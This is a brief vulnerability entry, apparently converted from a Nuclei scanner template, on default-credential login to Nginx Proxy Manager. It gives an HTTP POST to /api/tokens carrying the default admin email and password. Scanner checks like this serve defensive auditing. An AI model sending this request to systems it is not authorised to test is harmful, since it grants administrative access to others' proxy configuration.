# Vulnerability: Nginx Proxy Manager - Default Login
**Classification:** NGINX
**Source:** Nuclei Template (`nginx-proxy-manager-default-login.yaml`)

## Description
Default Nginx Proxy Manager credentials was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/tokens HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"identity": "admin@example.com","secret": "changeme"}
```

